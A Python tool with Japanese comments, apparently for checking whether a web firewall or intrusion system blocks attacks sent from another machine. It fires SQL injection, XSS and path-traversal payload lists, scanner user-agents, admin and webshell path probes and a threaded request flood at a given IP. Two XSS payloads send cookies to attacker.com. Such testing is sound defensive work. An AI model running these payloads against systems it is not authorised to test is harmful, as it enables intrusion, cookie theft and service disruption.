#!/usr/bin/env python3
"""
リモート攻撃テストツール
他のPCからセキュリティシステムをテストするためのツール

使用方法:
python3 remote_attack_tester.py --target <TARGET_IP> --port <PORT>
"""

import requests
import time
import argparse
import random
import threading
from urllib.parse import urlencode
import json
import sys
from datetime import datetime

class RemoteAttackTester:
    def __init__(self, target_ip, port=8080, https_port=443):
        self.target_ip = target_ip
        self.port = port
        self.https_port = https_port
        self.base_url_http = f"http://{target_ip}:{port}"
        self.base_url_https = f"https://{target_ip}:{https_port}"
        self.session = requests.Session()
        self.session.verify = False  # SSL証明書の検証を無効化（テスト用）
        
        # リクエストのタイムアウト設定
        self.timeout = 10
        
        # 攻撃結果を記録
        self.results = []
        
    def log_result(self, attack_type, url, status_code, response_time, blocked=False):
        """攻撃結果をログに記録"""
        result = {
            'timestamp': datetime.now().isoformat(),
            'attack_type': attack_type,
            'url': url,
            'status_code': status_code,
            'response_time': response_time,
            'blocked': blocked
        }
        self.results.append(result)
        
        status = "🚫 BLOCKED" if blocked else f"✅ {status_code}"
        print(f"[{result['timestamp']}] {attack_type}: {status} ({response_time:.3f}s)")
        
    def make_request(self, url, headers=None, params=None, method='GET'):
        """HTTPリクエストを送信し、結果を返す"""
        try:
            start_time = time.time()
            
            if method.upper() == 'GET':
                response = self.session.get(url, headers=headers, params=params, timeout=self.timeout)
            elif method.upper() == 'POST':
                response = self.session.post(url, headers=headers, data=params, timeout=self.timeout)
            
            response_time = time.time() - start_time
            return response.status_code, response_time, False
            
        except requests.exceptions.ConnectionError:
            response_time = time.time() - start_time
            return 0, response_time, True  # ブロックされた可能性
        except requests.exceptions.Timeout:
            return 408, self.timeout, True
        except Exception as e:
            print(f"Request error: {e}")
            return 0, 0, True

    def test_sql_injection(self):
        """SQLインジェクション攻撃をテスト"""
        print("\n🎯 SQLインジェクション攻撃テスト開始...")
        
        sql_payloads = [
            "1' OR '1'='1",
            "1; DROP TABLE users--",
            "1 UNION SELECT * FROM users",
            "1' UNION SELECT username, password FROM users--",
            "'; EXEC sp_configure 'show advanced options', 1--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
            "1' OR 1=1#",
            "admin'--",
            "' OR 'a'='a",
            "1; SELECT * FROM information_schema.tables"
        ]
        
        for payload in sql_payloads:
            params = {'id': payload, 'search': payload, 'user': payload}
            status, resp_time, blocked = self.make_request(self.base_url_http, params=params)
            self.log_result("SQL Injection", f"{self.base_url_http}?{urlencode(params)}", status, resp_time, blocked)
            time.sleep(0.5)  # レート制限を避けるため

    def test_xss_attacks(self):
        """XSS攻撃をテスト"""
        print("\n🎯 XSS攻撃テスト開始...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<script>document.location='http://attacker.com/'+document.cookie</script>",
            "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
        ]
        
        for payload in xss_payloads:
            params = {'q': payload, 'search': payload, 'comment': payload}
            status, resp_time, blocked = self.make_request(self.base_url_http, params=params)
            self.log_result("XSS Attack", f"{self.base_url_http}?{urlencode(params)}", status, resp_time, blocked)
            time.sleep(0.5)

    def test_path_traversal(self):
        """パストラバーサル攻撃をテスト"""
        print("\n🎯 パストラバーサル攻撃テスト開始...")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../../etc/passwd",
            "file:///etc/passwd",
            "php://filter/read=convert.base64-encode/resource=../../../etc/passwd"
        ]
        
        for payload in traversal_payloads:
            params = {'file': payload, 'path': payload, 'page': payload}
            status, resp_time, blocked = self.make_request(self.base_url_http, params=params)
            self.log_result("Path Traversal", f"{self.base_url_http}?{urlencode(params)}", status, resp_time, blocked)
            time.sleep(0.5)

    def test_malicious_user_agents(self):
        """悪意のあるUser-Agentをテスト"""
        print("\n🎯 悪意のあるUser-Agent攻撃テスト開始...")
        
        malicious_uas = [
            "sqlmap/1.0",
            "Nikto/2.1.6",
            "w3af.org",
            "Nessus",
            "OpenVAS",
            "Nmap Scripting Engine",
            "ZmEu",
            "libwww-perl/6.0",
            "Python-urllib/3.8",
            "Wget/1.21",
            "curl/7.68.0 (bot)",
            "Mozilla/5.0 (compatible; Baiduspider/2.0)",
            "python-requests/2.25.1 (scanner)",
            "Go-http-client/1.1 (vulnerability scanner)"
        ]
        
        for ua in malicious_uas:
            headers = {'User-Agent': ua}
            status, resp_time, blocked = self.make_request(self.base_url_http, headers=headers)
            self.log_result("Malicious User-Agent", self.base_url_http, status, resp_time, blocked)
            time.sleep(0.5)

    def test_404_scanning(self):
        """404スキャン攻撃をテスト"""
        print("\n🎯 404スキャン攻撃テスト開始...")
        
        common_paths = [
            "/admin", "/administrator", "/admin.php", "/wp-admin",
            "/phpmyadmin", "/phpMyAdmin", "/pma", "/mysql",
            "/backup", "/backups", "/backup.sql", "/backup.zip",
            "/config", "/config.php", "/configuration", "/settings",
            "/login", "/login.php", "/signin", "/auth",
            "/panel", "/cpanel", "/control", "/dashboard",
            "/test", "/testing", "/dev", "/development",
            "/staging", "/stage", "/prod", "/production",
            "/api", "/api/v1", "/rest", "/webservice",
            "/upload", "/uploads", "/files", "/documents",
            "/logs", "/log", "/error.log", "/access.log",
            "/robots.txt", "/sitemap.xml", "/.htaccess", "/web.config",
            "/shell.php", "/cmd.php", "/webshell.php", "/c99.php"
        ]
        
        for path in common_paths:
            url = f"{self.base_url_http}{path}"
            status, resp_time, blocked = self.make_request(url)
            self.log_result("404 Scan", url, status, resp_time, blocked)
            time.sleep(0.2)  # 高速スキャンをシミュレート

    def test_dos_attack(self, duration=30, threads=5):
        """DoS攻撃をテスト（軽量版）"""
        print(f"\n🎯 DoS攻撃テスト開始 ({duration}秒間, {threads}スレッド)...")
        
        def dos_worker():
            end_time = time.time() + duration
            while time.time() < end_time:
                status, resp_time, blocked = self.make_request(self.base_url_http)
                self.log_result("DoS Attack", self.base_url_http, status, resp_time, blocked)
                time.sleep(0.1)  # 10 req/sec per thread
        
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=dos_worker)
            t.start()
            threads_list.append(t)
        
        for t in threads_list:
            t.join()

    def test_ssl_attacks(self):
        """SSL/TLS攻撃をテスト"""
        print("\n🎯 SSL/TLS攻撃テスト開始...")
        
        # 不正な SSL ハンドシェイクを試行
        import ssl
        import socket
        
        try:
            # 古いSSLプロトコルでの接続試行
            context = ssl.create_default_context()
            context.minimum_version = ssl.TLSVersion.TLSv1
            
            with socket.create_connection((self.target_ip, self.https_port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.target_ip) as ssock:
                    # SSL情報を取得
                    cert = ssock.getpeercert()
                    print(f"SSL接続成功: {cert.get('subject', 'Unknown')}")
                    
        except Exception as e:
            print(f"SSL接続テスト: {e}")

        # HTTPS経由での通常攻撃
        status, resp_time, blocked = self.make_request(self.base_url_https)
        self.log_result("HTTPS Test", self.base_url_https, status, resp_time, blocked)

    def run_comprehensive_test(self):
        """包括的な攻撃テストを実行"""
        print(f"🚀 包括的攻撃テスト開始: {self.target_ip}")
        print(f"HTTP Target: {self.base_url_http}")
        print(f"HTTPS Target: {self.base_url_https}")
        print("=" * 60)
        
        # 基本接続テスト
        print("\n🔍 基本接続テスト...")
        status, resp_time, blocked = self.make_request(self.base_url_http)
        self.log_result("Basic Connection", self.base_url_http, status, resp_time, blocked)
        
        if blocked:
            print("⚠️  警告: 基本接続が失敗しました。ターゲットが利用可能か確認してください。")
            return
        
        # 各種攻撃テストを実行
        self.test_sql_injection()
        self.test_xss_attacks()
        self.test_path_traversal()
        self.test_malicious_user_agents()
        self.test_404_scanning()
        self.test_ssl_attacks()
        
        # DoS攻撃（軽量版）
        self.test_dos_attack(duration=15, threads=3)
        
        # 結果のサマリーを表示
        self.print_summary()

    def print_summary(self):
        """テスト結果のサマリーを表示"""
        print("\n" + "=" * 60)
        print("📊 攻撃テスト結果サマリー")
        print("=" * 60)
        
        total_attacks = len(self.results)
        blocked_attacks = sum(1 for r in self.results if r['blocked'])
        successful_attacks = total_attacks - blocked_attacks
        
        print(f"総攻撃数: {total_attacks}")
        print(f"ブロック数: {blocked_attacks}")
        print(f"成功数: {successful_attacks}")
        print(f"ブロック率: {(blocked_attacks/total_attacks)*100:.1f}%")
        
        # 攻撃タイプ別の統計
        attack_types = {}
        for result in self.results:
            attack_type = result['attack_type']
            if attack_type not in attack_types:
                attack_types[attack_type] = {'total': 0, 'blocked': 0}
            attack_types[attack_type]['total'] += 1
            if result['blocked']:
                attack_types[attack_type]['blocked'] += 1
        
        print("\n📈 攻撃タイプ別統計:")
        for attack_type, stats in attack_types.items():
            block_rate = (stats['blocked']/stats['total'])*100
            print(f"  {attack_type}: {stats['blocked']}/{stats['total']} ブロック ({block_rate:.1f}%)")
        
        # 結果をJSONファイルに保存
        output_file = f"attack_test_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        print(f"\n💾 詳細結果を保存: {output_file}")

def main():
    parser = argparse.ArgumentParser(description='リモート攻撃テストツール')
    parser.add_argument('--target', '-t', required=True, help='ターゲットIPアドレス')
    parser.add_argument('--port', '-p', type=int, default=8080, help='HTTPポート番号 (デフォルト: 8080)')
    parser.add_argument('--https-port', type=int, default=443, help='HTTPSポート番号 (デフォルト: 443)')
    parser.add_argument('--test', choices=['sql', 'xss', 'path', 'ua', '404', 'dos', 'ssl', 'all'], 
                       default='all', help='実行するテストタイプ')
    
    args = parser.parse_args()
    
    # SSL警告を抑制
    requests.packages.urllib3.disable_warnings()
    
    tester = RemoteAttackTester(args.target, args.port, args.https_port)
    
    if args.test == 'all':
        tester.run_comprehensive_test()
    elif args.test == 'sql':
        tester.test_sql_injection()
    elif args.test == 'xss':
        tester.test_xss_attacks()
    elif args.test == 'path':
        tester.test_path_traversal()
    elif args.test == 'ua':
        tester.test_malicious_user_agents()
    elif args.test == '404':
        tester.test_404_scanning()
    elif args.test == 'dos':
        tester.test_dos_attack()
    elif args.test == 'ssl':
        tester.test_ssl_attacks()
    
    tester.print_summary()

if __name__ == "__main__":
    main()
